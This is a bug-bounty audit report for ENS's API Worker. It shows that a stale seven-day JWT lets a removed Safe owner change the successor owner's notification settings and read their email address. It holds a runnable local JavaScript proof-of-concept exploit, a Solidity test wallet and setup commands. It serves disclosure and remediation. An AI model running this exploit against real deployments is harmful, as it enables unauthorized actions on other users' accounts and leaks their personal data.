# 93024 w a insight stale worker jwt lets a removed safe owner modify successor notifications and read their email

**Submitted on Sep 13th 2026 at 23:55:56 UTC by @vtim for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #93024
* **Report Type:** Websites & Apps
* **Report severity:** Insight
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/workers>
* **Impacts:**
  * Taking state-modifying authenticated actions (with or without blockchain state interaction) on behalf of other users without any interaction by that user, such as: Changing registration information Notification/settings changes
  * Improperly disclosing confidential user information, such as: Email address

## Description

## 2. Description (`description`)

## Brief/Intro

The API Worker turns a state-dependent EIP-1271 ownership proof into a stateless seven-day JWT. Current wallet authority is checked only when the JWT is issued. Protected requests later trust the token's stable Safe address and `user_id` without checking whether the signer who obtained it is still authorized.

I am aware of R2-06. There, local revocation leaves the smart-account session key authorized on-chain. Here `swapOwner(A, B)` has already removed A on-chain and fresh A login fails, but A's separate server-issued Worker JWT still works. Fixing R2-06's on-chain revocation therefore does not fix this path.

I reproduced this with a one-owner Safe. A authenticated and received a Worker JWT, then the Safe replaced A with B as its sole owner. On-chain signature verification and a fresh Worker login both rejected A and accepted B, but A's pre-rotation JWT still acted as the same Worker principal. Without any further action or approval by B, A changed B's notification setting, read B's complete verified email address, deleted B's post-rotation email and push channels, and installed an A-controlled verified push destination.

A matched control repeated the same Safe replacement, B login, and B resource creation, but withheld A's old bearer. Every former-owner request returned 401; B's setting and channels remained unchanged.

## Vulnerability Details

### Broken authorization invariant

An EOA address and its signing key normally move together. An EIP-1271 contract address does not: its authorized signers can change while the address remains constant. A session derived from an EIP-1271 proof must therefore preserve or revalidate the authority generation that issued it. The Worker instead treats the unchanged contract address as sufficient identity for the token's full lifetime.

Once the Safe rejects A and recognizes only B, A's old Worker credential should not authorize data that B creates after the owner change. The product does not present the JWT as an owner-independent delegation or provide B with a way to revoke it.

### Root cause: current authority is checked only at issuance

`workers/api-worker/src/services/auth/index.ts:95-121` verifies the current EIP-1271-aware SIWE signature, resolves the stable address to a user, and signs a JWT containing only that address and `user_id`:

```ts
const valid = yield* safeVerifySiweMessage(client, {
  address,
  message,
  signature,
  nonce,
  domain: parsed.domain,
})

if (!valid) {
  yield* new InvalidSignatureError({ message: 'Unable to verify signature' })
}

const user = yield* addUserIfNotExists(db, address)

const jwt = yield* signJWT({
  address,
  user_id: user.id,
}, env)
```

`workers/api-worker/src/core/auth/jwt.ts:6-11,41-53` gives the token a seven-day expiry. Its application payload has no issuing signer, session id, authority generation, or server-side revocation handle:

```ts
const JWT_EXPIRATION = 60 * 60 * 24 * 7

export const AuthPayload = v.object({
  user_id: v.string(),
  address: v.string(),
})

// ...
{ ...payload, exp: Math.floor(Date.now() / 1000) + validFor }
```

For every subsequent protected request, `workers/api-worker/src/app/middleware/auth.ts:7-35` verifies only the HS256 bearer and copies its claims into request state:

```ts
const jwtMiddleware = honoJwt({
  secret: c.env.JWT_SECRET,
  alg: 'HS256',
})

// ...
c.set('address', payload.output.address)
c.set('user_id', payload.output.user_id)
```

There is no current EIP-1271 check, authority epoch, or session lookup. Meanwhile, `workers/api-worker/src/core/database/schema/core.ts:8-14` makes the Safe address unique, so A before rotation and B after rotation resolve to the same persistent Worker `user_id`.

### The stale principal reaches successor data directly

`GET /notifications/channels` queries every channel by the JWT's `user_id` (`workers/api-worker/src/app/routes/notifications/channels/index.ts:30-51`). For email channels, `workers/api-worker/src/services/notifications/helpers.ts:95-115` maps the stored target to `label` without masking it:

```ts
return ok({
  id: channel.id,
  channel: 'email',
  status: channel.status,
  // ...
  label: sanitizeChannel('email', channel.target, channel.data),
})
```

`sanitizeChannel()` returns the email target at lines 29-43, so A's stale token discloses B's complete verified address.

Deletion has the same stale-principal boundary. `workers/api-worker/src/app/routes/notifications/channels/$id.ts:62-80` checks only that the row's `user_id` equals the value copied from the JWT and then deletes the row. The preference update in `workers/api-worker/src/app/routes/notifications/preferences.ts:62-119` also writes solely by that `user_id`.

The old token can also call the normal push route. At `workers/api-worker/src/app/routes/notifications/channels/push.ts:100-127`, a new subscription is immediately stored as `verified` under the stale `user_id`. Its endpoint and Web Push keys are supplied by A.

### Exploit sequence

1. A is the legitimate sole signer of a supported EIP-1271 wallet and uses the normal Worker nonce/SIWE login flow. The Worker issues a real JWT whose observed lifetime is 604800 seconds.
2. Before that token expires, the Safe executes `swapOwner(A, B)`. Its address remains constant and its live owner list now contains only B.
3. Fresh A signature verification and Worker authentication fail. Fresh B verification and authentication succeed. This proves that the underlying authority transition is complete.
4. After the transition, B creates verified email and push channels and establishes a false notification-preference baseline.
5. A presents the retained pre-rotation token. Because A's old token and B's current token contain the same address-keyed `user_id`, the Worker treats both as the same current principal.
6. A reads B's full verified email, flips B's preference, deletes B's email and push channels, and registers an attacker-controlled verified push endpoint. B does not click, sign, connect, or approve anything for A.

### Email disclosure path

I also reproduced the email impact with a one-owner Safe. After the A-to-B owner replacement, B created an email channel and completed the normal verification flow, with delivery captured by a local mail sink. The channel appeared as `verified`; A's pre-rotation bearer then returned the complete email address and deleted the channel with HTTP 200. Without A's bearer, the same requests returned 401 and the channel remained intact.

## Impact Details

The first selected ENS impact is Critical:

> Taking state-modifying authenticated actions (with or without blockchain state interaction) on behalf of other users without any interaction by that user, such as: Changing registration information Notification/settings changes

The PoC matches it directly. Once B is the only current wallet controller, A's stale session changes B's notification preference, deletes B's post-rotation push channel, and installs A's verified push destination. B performs no interaction for those requests.

The second selected impact is High:

> Improperly disclosing confidential user information, such as: Email address

In the Safe reproduction, the list response gives A B's complete verified email address. Without A's bearer, the request returns 401 and the channel remains intact.

I select Critical because the program's own impact table assigns the first demonstrated result to Critical. The email disclosure also matches the program's High impact. This report does **not** claim Safe compromise, wallet-key access, ENS-name takeover, malicious wallet transactions, fund/NFT theft, or acceptance of an expired JWT.

## References

* Current competition scope and known issues: <https://immunefi.com/audit-competition/audit-competition-ens/scope/>
* Competition snapshot: `audit-comp-ready @ 1c9b47f18fcddd2e864dfe385c4171061c9811ae`
* Upstream ENS Apps revision: `63772fd872af472ced58b009499355f3430c2a86`
* `workers/api-worker/src/services/auth/index.ts:95-121`
* `workers/api-worker/src/core/auth/jwt.ts:6-11,41-53`
* `workers/api-worker/src/app/middleware/auth.ts:7-35`
* `workers/api-worker/src/core/database/schema/core.ts:8-14`
* `workers/api-worker/src/app/routes/notifications/channels/index.ts:30-51`
* `workers/api-worker/src/services/notifications/helpers.ts:29-43,95-115`
* `workers/api-worker/src/app/routes/notifications/channels/$id.ts:62-80`
* `workers/api-worker/src/app/routes/notifications/channels/email.ts:74-169,172-260`
* `workers/api-worker/src/app/routes/notifications/channels/push.ts:47-128`
* `workers/api-worker/src/app/routes/notifications/preferences.ts:62-119`
* `workers/api-worker/src/services/email/utils.ts:8,23-47`
* ERC-4361, Session Invalidation: <https://eips.ethereum.org/EIPS/eip-4361>

## Proof of Concept

## Proof of Concept

### Overview

The script deploys a mutable EIP-1271 wallet to Anvil with A as its owner. A authenticates through the API Worker and receives a seven-day JWT. A then rotates the wallet owner to B in a mined transaction. Fresh authentication rejects A and accepts B, but A's earlier JWT can still modify notification settings and channels associated with the wallet after B takes control.

The test contract source is included below. Its compiled creation bytecode is embedded in the JavaScript, so no Solidity compiler is required to run the reproduction.

### Prerequisites

* A clean checkout of the competition repository at `audit-comp-ready @ 1c9b47f18fcddd2e864dfe385c4171061c9811ae` (upstream ENS Apps revision `63772fd872af472ced58b009499355f3430c2a86`).
* Node.js 22, pnpm 10.27.0, Docker with Compose, and ports 5432, 4444, 12999, and 18546 available on loopback.
* Run every command below from the repository root. The script uses Anvil's default accounts 0 and 1.

### 1. Install dependencies

```bash
corepack enable
pnpm install --frozen-lockfile
```

### 2. Start a clean local database and apply the repository migrations

```bash
docker compose -f workers/api-worker/compose.yaml up -d --build --wait
DATABASE_URL=postgresql://postgres:postgres@127.0.0.1:5432/postgres \
  pnpm --dir workers/api-worker exec drizzle-kit migrate
```

Use a fresh checkout or an otherwise empty `workers/api-worker/.tools/postgres` directory so the result is not affected by old local rows.

### 3. Start Anvil

Run this in terminal 1:

```bash
docker run --rm --name ens-jwt-poc-anvil \
  --publish 127.0.0.1:18546:8545 \
  --entrypoint anvil \
  ghcr.io/foundry-rs/foundry@sha256:8347b728d5d393dac1c018691b36f506d23b9dcd78341d40ea0fcb11c3a19cdd \
  --chain-id 11155111 --host 0.0.0.0
```

### 4. Configure and start the API Worker

Create `workers/api-worker/.dev.vars` with these values:

```dotenv
CHAIN="sepolia"
DATABASE_URL="postgres://postgres:postgres@db.localtest.me:5432/postgres"
JWT_SECRET="local-poc-only-not-a-production-secret"
SEPOLIA_RPC_URL="http://127.0.0.1:18546"
SENDGRID_API_KEY="local-disabled"
TELEGRAM_BOT_TOKEN="local-disabled"
TELEGRAM_WEBHOOK_SECRET="local-disabled"
VAPID_PRIVATE_KEY="local-disabled"
```

The PoC does not call email routes, so the provider variables can remain dummy values.

Run this in terminal 2:

```bash
pnpm --dir workers/api-worker exec vite dev \
  --configLoader runner --host 127.0.0.1 --port 12999
```

Confirm the Worker is ready:

```bash
curl --fail --request POST http://127.0.0.1:12999/auth/nonce
```

### 5. Save and run the single-file exploit

Save the JavaScript at the end of this section as `eip1271-owner-rotation.mjs` in the repository root, then run:

```bash
ENS_REPO_ROOT="$PWD" \
RPC_URL=http://127.0.0.1:18546 \
API_URL=http://127.0.0.1:12999 \
node ./eip1271-owner-rotation.mjs
```

The command must exit 0. The mined rotation changes the contract's only owner to B; fresh A EIP-1271 validation is false and `POST /auth/login` returns 400; fresh B validation is true and login returns 200; the old-A and current-B tokens contain the same Worker `user_id`; and A's retained token receives 200/201 while changing B's preference, listing and deleting B's post-rotation channel, and adding A's verified push channel. Every value in `assertions` must be `true`.

### 6. Run the negative control

The control deploys a new EIP-1271 wallet and makes the final former-owner requests without A's retained bearer:

```bash
ENS_REPO_ROOT="$PWD" \
RPC_URL=http://127.0.0.1:18546 \
API_URL=http://127.0.0.1:12999 \
node ./eip1271-owner-rotation.mjs --negative-control
```

This command must also exit 0. Fresh A must still fail and fresh B must still succeed, but all four unauthenticated preference/create/list/delete calls must return 401. B's false preference and post-rotation channel must survive, and every control assertion must be `true`.

### Safe reproduction

I also repeated the sequence with a one-owner Safe. After `swapOwner(A, B)`, `getOwners()` returned only B, fresh A authentication failed, and fresh B authentication succeeded. B then verified an email channel through the Worker; A's earlier JWT returned the complete email address and deleted the channel with HTTP 200. Without A's bearer, both requests returned 401 and the channel remained intact.

### Cleanup

Stop terminal 2, stop terminal 1, and then stop the repository database services:

```bash
docker compose -f workers/api-worker/compose.yaml down
```

### EIP-1271 test contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// @notice Minimal EIP-1271 wallet with a rotatable owner.
contract RotatingEIP1271Wallet {
    bytes4 private constant MAGIC_VALUE = 0x1626ba7e;
    bytes4 private constant INVALID_VALUE = 0xffffffff;

    address public owner;

    constructor(address initialOwner) {
        owner = initialOwner;
    }

    function rotateOwner(address nextOwner) external {
        require(msg.sender == owner, "not owner");
        require(nextOwner != address(0), "zero owner");
        owner = nextOwner;
    }

    function isValidSignature(bytes32 hash, bytes calldata signature)
        external
        view
        returns (bytes4)
    {
        if (signature.length != 65) return INVALID_VALUE;

        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := calldataload(signature.offset)
            s := calldataload(add(signature.offset, 32))
            v := byte(0, calldataload(add(signature.offset, 64)))
        }

        if (v < 27) v += 27;
        if (v != 27 && v != 28) return INVALID_VALUE;
        return ecrecover(hash, v, r, s) == owner ? MAGIC_VALUE : INVALID_VALUE;
    }
}
```

### Runnable single-file PoC

```javascript
import { createECDH } from 'node:crypto'
import { pathToFileURL } from 'node:url'
import { resolve } from 'node:path'

const repoRoot = resolve(process.env.ENS_REPO_ROOT ?? process.cwd())
const viemRoot = resolve(repoRoot, 'node_modules/viem/_esm')
const {
  createPublicClient,
  createWalletClient,
  hashMessage,
  http,
  parseAbi,
} = await import(pathToFileURL(resolve(viemRoot, 'index.js')).href)
const { privateKeyToAccount } = await import(
  pathToFileURL(resolve(viemRoot, 'accounts/index.js')).href
)
const { createSiweMessage } = await import(
  pathToFileURL(resolve(viemRoot, 'siwe/index.js')).href
)

const rpcUrl = process.env.RPC_URL ?? 'http://127.0.0.1:18546'
const apiUrl = (process.env.API_URL ?? 'http://127.0.0.1:12999').replace(/\/$/, '')
const chainId = Number(process.env.CHAIN_ID ?? 11155111)
const negativeControl = process.argv.includes('--negative-control')

// Anvil default accounts 0 and 1.
const accountA = privateKeyToAccount(
  process.env.OWNER_A_PRIVATE_KEY ??
    '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80',
)
const accountB = privateKeyToAccount(
  process.env.OWNER_B_PRIVATE_KEY ??
    '0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d',
)

function requireLocalUrl(label, value) {
  const host = new URL(value).hostname
  if (!['127.0.0.1', 'localhost', '::1'].includes(host)) {
    throw new Error(`${label} must be a loopback URL (received ${host})`)
  }
}

requireLocalUrl('RPC_URL', rpcUrl)
requireLocalUrl('API_URL', apiUrl)

const chain = {
  id: chainId,
  name: 'local-sepolia',
  nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
  rpcUrls: { default: { http: [rpcUrl] } },
}
const publicClient = createPublicClient({ chain, transport: http(rpcUrl) })
const walletA = createWalletClient({ account: accountA, chain, transport: http(rpcUrl) })

const walletAbi = parseAbi([
  'constructor(address initialOwner)',
  'function owner() view returns (address)',
  'function rotateOwner(address nextOwner)',
  'function isValidSignature(bytes32 hash, bytes signature) view returns (bytes4)',
])

// solc 0.8.33 creation bytecode for RotatingEIP1271Wallet.
const walletBytecode =
  '0x608060405234801561000f575f5ffd5b50604051610836380380610836833981810160405281019061003191906100d4565b805f5f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506100ff565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100a38261007a565b9050919050565b6100b381610099565b81146100bd575f5ffd5b50565b5f815190506100ce816100aa565b92915050565b5f602082840312156100e9576100e8610076565b5b5f6100f6848285016100c0565b91505092915050565b61072a8061010c5f395ff3fe608060405234801561000f575f5ffd5b506004361061003f575f3560e01c80631626ba7e146100435780633c037ee3146100735780638da5cb5b1461008f575b5f5ffd5b61005d600480360381019061005891906103e9565b6100ad565b60405161006a9190610480565b60405180910390f35b61008d600480360381019061008891906104f3565b6101eb565b005b610097610329565b6040516100a4919061052d565b60405180910390f35b5f604183839050146100c85763ffffffff60e01b90506101e4565b5f5f5f853592506020860135915060408601355f1a9050601b8160ff1610156100fb57601b816100f8919061057f565b90505b601b8160ff16141580156101135750601c8160ff1614155b1561012a5763ffffffff60e01b93505050506101e4565b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166001888386866040515f815260200160405260405161018394939291906105d1565b6020604051602081039080840390855afa1580156101a3573d5f5f3e3d5ffd5b5050506020604051035173ffffffffffffffffffffffffffffffffffffffff16146101d55763ffffffff60e01b6101de565b631626ba7e60e01b5b93505050505b9392505050565b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610279576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016102709061066e565b60405180910390fd5b5f73ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16036102e7576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016102de906106d6565b60405180910390fd5b805f5f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f5ffd5b5f5ffd5b5f819050919050565b61036781610355565b8114610371575f5ffd5b50565b5f813590506103828161035e565b92915050565b5f5ffd5b5f5ffd5b5f5ffd5b5f5f83601f8401126103a9576103a8610388565b5b8235905067ffffffffffffffff8111156103c6576103c561038c565b5b6020830191508360018202830111156103e2576103e1610390565b5b9250929050565b5f5f5f60408486031215610400576103ff61034d565b5b5f61040d86828701610374565b935050602084013567ffffffffffffffff81111561042e5761042d610351565b5b61043a86828701610394565b92509250509250925092565b5f7fffffffff0000000000000000000000000000000000000000000000000000000082169050919050565b61047a81610446565b82525050565b5f6020820190506104935f830184610471565b92915050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6104c282610499565b9050919050565b6104d2816104b8565b81146104dc575f5ffd5b50565b5f813590506104ed816104c9565b92915050565b5f602082840312156105085761050761034d565b5b5f610515848285016104df565b91505092915050565b610527816104b8565b82525050565b5f6020820190506105405f83018461051e565b92915050565b5f60ff82169050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f61058982610546565b915061059483610546565b9250828201905060ff8111156105ad576105ac610552565b5b92915050565b6105bc81610355565b82525050565b6105cb81610546565b82525050565b5f6080820190506105e45f8301876105b3565b6105f160208301866105c2565b6105fe60408301856105b3565b61060b60608301846105b3565b95945050505050565b5f82825260208201905092915050565b7f6e6f74206f776e657200000000000000000000000000000000000000000000005f82015250565b5f610658600983610614565b915061066382610624565b602082019050919050565b5f6020820190508181035f8301526106858161064c565b9050919050565b7f7a65726f206f776e6572000000000000000000000000000000000000000000005f82015250565b5f6106c0600a83610614565b91506106cb8261068c565b602082019050919050565b5f6020820190508181035f8301526106ed816106b4565b905091905056fea2646970667358221220973f6235275822372017735f9a37b59ebb5c83a02b96b1b85cc3d24ab5cf4be564736f6c63430008210033'

async function apiRequest(path, { token, method = 'GET', body } = {}) {
  const response = await fetch(`${apiUrl}${path}`, {
    method,
    headers: {
      ...(token ? { authorization: `Bearer ${token}` } : {}),
      ...(body === undefined ? {} : { 'content-type': 'application/json' }),
    },
    body: body === undefined ? undefined : JSON.stringify(body),
  })
  const raw = await response.text()
  let parsed = raw
  try {
    parsed = JSON.parse(raw)
  } catch {}
  return { status: response.status, body: parsed }
}

function jwtClaims(token) {
  const payload = token?.split('.')[1]
  if (!payload) throw new Error('Worker returned a malformed JWT')
  return JSON.parse(Buffer.from(payload, 'base64url').toString('utf8'))
}

function pushKeys(privateScalar, authByte) {
  const ecdh = createECDH('prime256v1')
  ecdh.setPrivateKey(Buffer.from(privateScalar.padStart(64, '0'), 'hex'))
  return {
    auth: Buffer.alloc(16, authByte).toString('base64url'),
    p256dh: ecdh.getPublicKey(undefined, 'uncompressed').toString('base64url'),
  }
}

async function login(walletAddress, signer) {
  const nonceResponse = await apiRequest('/auth/nonce', { method: 'POST' })
  if (nonceResponse.status !== 200) {
    throw new Error(`Worker nonce preflight failed: ${JSON.stringify(nonceResponse)}`)
  }
  const message = createSiweMessage({
    address: walletAddress,
    chainId,
    domain: 'app.ens.dev',
    nonce: nonceResponse.body.nonce,
    uri: 'https://app.ens.dev',
    version: '1',
  })
  const signature = await signer.sign({ hash: hashMessage(message) })
  const currentAuthorityValid = await publicClient.verifyMessage({
    address: walletAddress,
    message,
    signature,
  })
  const response = await apiRequest('/auth/login', {
    method: 'POST',
    body: {
      address: walletAddress,
      message,
      signature,
      nonce: nonceResponse.body.nonce,
    },
  })
  return { ...response, currentAuthorityValid }
}

const observedChainId = await publicClient.getChainId()
if (observedChainId !== chainId) {
  throw new Error(`RPC chain id ${observedChainId} does not match expected ${chainId}`)
}

const deployHash = await walletA.deployContract({
  abi: walletAbi,
  bytecode: walletBytecode,
  args: [accountA.address],
})
const deployReceipt = await publicClient.waitForTransactionReceipt({ hash: deployHash })
const walletAddress = deployReceipt.contractAddress
if (!walletAddress) throw new Error('EIP-1271 wallet deployment returned no address')

const result = {
  mode: negativeControl ? 'negative-control' : 'exploit',
  target: { rpcUrl, apiUrl, chainId },
  actors: { formerOwner: accountA.address, currentOwner: accountB.address },
  wallet: { address: walletAddress, deploymentTransaction: deployHash },
}

const initialLogin = await login(walletAddress, accountA)
if (initialLogin.status !== 200 || initialLogin.currentAuthorityValid !== true) {
  throw new Error(`initial owner login failed: ${JSON.stringify(initialLogin)}`)
}
const staleToken = initialLogin.body.token
const staleClaims = jwtClaims(staleToken)
result.initialAuthentication = {
  status: initialLogin.status,
  currentAuthorityValid: initialLogin.currentAuthorityValid,
  claims: staleClaims,
  tokenLifetimeSeconds: staleClaims.exp - Math.floor(Date.now() / 1000),
}

const rotationHash = await walletA.writeContract({
  address: walletAddress,
  abi: walletAbi,
  functionName: 'rotateOwner',
  args: [accountB.address],
})
const rotationReceipt = await publicClient.waitForTransactionReceipt({ hash: rotationHash })
const ownerAfterRotation = await publicClient.readContract({
  address: walletAddress,
  abi: walletAbi,
  functionName: 'owner',
})
result.rotation = {
  transaction: rotationHash,
  status: rotationReceipt.status,
  ownerAfterRotation,
  staleTokenRemainingSeconds: staleClaims.exp - Math.floor(Date.now() / 1000),
}

const freshLoginA = await login(walletAddress, accountA)
const freshLoginB = await login(walletAddress, accountB)
if (freshLoginB.status !== 200 || freshLoginB.currentAuthorityValid !== true) {
  throw new Error(`current owner login failed: ${JSON.stringify(freshLoginB)}`)
}
const currentToken = freshLoginB.body.token
const currentClaims = jwtClaims(currentToken)
result.currentAuthentication = {
  formerOwner: {
    status: freshLoginA.status,
    currentAuthorityValid: freshLoginA.currentAuthorityValid,
    error: freshLoginA.body?.error,
  },
  currentOwner: {
    status: freshLoginB.status,
    currentAuthorityValid: freshLoginB.currentAuthorityValid,
    claims: currentClaims,
  },
  staleAndCurrentTokensShareUserId: staleClaims.user_id === currentClaims.user_id,
}

const successorSubscription = {
  endpoint: `https://fcm.googleapis.com/fcm/send/current-${walletAddress.slice(2)}`,
  expirationTime: null,
  keys: pushKeys('3', 0xb3),
}
const successorChannel = await apiRequest('/notifications/channels/push', {
  token: currentToken,
  method: 'POST',
  body: successorSubscription,
})
const successorChannelId = successorChannel.body?.id
if (successorChannel.status !== 201 || !successorChannelId) {
  throw new Error(`current owner channel setup failed: ${JSON.stringify(successorChannel)}`)
}

const baselinePatch = await apiRequest('/notifications/preferences', {
  token: currentToken,
  method: 'PATCH',
  body: {
    ownedNameExpiry: false,
    favouritedNameExpiry: false,
    ensLabsUpdates: false,
  },
})
const baselineRead = await apiRequest('/notifications/preferences', { token: currentToken })
if (
  baselinePatch.status !== 200 ||
  baselineRead.status !== 200 ||
  baselineRead.body?.settings?.ownedNameExpiry !== false
) {
  throw new Error(`current owner preference setup failed: ${JSON.stringify(baselineRead)}`)
}

const attackToken = negativeControl ? undefined : staleToken
const formerOwnerSubscription = {
  endpoint: `https://fcm.googleapis.com/fcm/send/former-${walletAddress.slice(2)}`,
  expirationTime: null,
  keys: pushKeys('1', 0xa1),
}
const formerOwnerCreate = await apiRequest('/notifications/channels/push', {
  token: attackToken,
  method: 'POST',
  body: formerOwnerSubscription,
})
const formerOwnerCreatedId = formerOwnerCreate.body?.id
const formerOwnerPatch = await apiRequest('/notifications/preferences', {
  token: attackToken,
  method: 'PATCH',
  body: { ownedNameExpiry: true },
})
const formerOwnerList = await apiRequest('/notifications/channels', { token: attackToken })
const formerOwnerDelete = await apiRequest(
  `/notifications/channels/${successorChannelId}`,
  { token: attackToken, method: 'DELETE' },
)

const finalPreferences = await apiRequest('/notifications/preferences', { token: currentToken })
const finalChannels = await apiRequest('/notifications/channels', { token: currentToken })
const finalChannelRows = Array.isArray(finalChannels.body) ? finalChannels.body : []
const successorChannelSurvives = finalChannelRows.some(
  (channel) => channel.id === successorChannelId,
)
const formerOwnerChannelVisible = finalChannelRows.some(
  (channel) => channel.id === formerOwnerCreatedId && channel.status === 'verified',
)
const formerOwnerSawSuccessorChannel =
  Array.isArray(formerOwnerList.body) &&
  formerOwnerList.body.some((channel) => channel.id === successorChannelId)

result.stateChange = {
  currentOwnerBaseline: {
    channelId: successorChannelId,
    ownedNameExpiry: baselineRead.body?.settings?.ownedNameExpiry,
  },
  formerOwnerRequests: {
    preferencePatchStatus: formerOwnerPatch.status,
    createChannelStatus: formerOwnerCreate.status,
    listStatus: formerOwnerList.status,
    deleteSuccessorChannelStatus: formerOwnerDelete.status,
  },
  currentOwnerFinal: {
    ownedNameExpiry: finalPreferences.body?.settings?.ownedNameExpiry,
    successorChannelSurvives,
    formerOwnerChannelVisible,
  },
}

result.assertions = negativeControl
  ? {
      ownerRotatedToB: ownerAfterRotation.toLowerCase() === accountB.address.toLowerCase(),
      freshFormerOwnerAuthenticationRejected:
        freshLoginA.status === 400 && freshLoginA.currentAuthorityValid === false,
      freshCurrentOwnerAuthenticationAccepted:
        freshLoginB.status === 200 && freshLoginB.currentAuthorityValid === true,
      stableAddressMapsBothOwnersToSameWorkerPrincipal:
        staleClaims.user_id === currentClaims.user_id,
      currentOwnerCreatedPostRotationState: successorChannel.status === 201,
      noBearerCannotChangePreference: formerOwnerPatch.status === 401,
      noBearerCannotCreateChannel: formerOwnerCreate.status === 401,
      noBearerCannotListChannels: formerOwnerList.status === 401,
      noBearerCannotDeleteSuccessorChannel: formerOwnerDelete.status === 401,
      currentOwnerPreferenceSurvives:
        finalPreferences.body?.settings?.ownedNameExpiry === false,
      currentOwnerChannelSurvives: successorChannelSurvives === true,
      noFormerOwnerChannelAppears: formerOwnerChannelVisible === false,
    }
  : {
      ownerRotatedToB: ownerAfterRotation.toLowerCase() === accountB.address.toLowerCase(),
      freshFormerOwnerAuthenticationRejected:
        freshLoginA.status === 400 && freshLoginA.currentAuthorityValid === false,
      freshCurrentOwnerAuthenticationAccepted:
        freshLoginB.status === 200 && freshLoginB.currentAuthorityValid === true,
      stableAddressMapsBothOwnersToSameWorkerPrincipal:
        staleClaims.user_id === currentClaims.user_id,
      currentOwnerCreatedPostRotationState: successorChannel.status === 201,
      staleTokenChangesSuccessorPreference:
        formerOwnerPatch.status === 200 &&
        finalPreferences.body?.settings?.ownedNameExpiry === true,
      staleTokenCreatesVerifiedFormerOwnerChannel:
        formerOwnerCreate.status === 201 && formerOwnerChannelVisible === true,
      staleTokenListsSuccessorChannel:
        formerOwnerList.status === 200 && formerOwnerSawSuccessorChannel === true,
      staleTokenDeletesSuccessorChannel:
        formerOwnerDelete.status === 200 && successorChannelSurvives === false,
    }

console.log(JSON.stringify(result, null, 2))
if (!Object.values(result.assertions).every(Boolean)) process.exitCode = 1
```
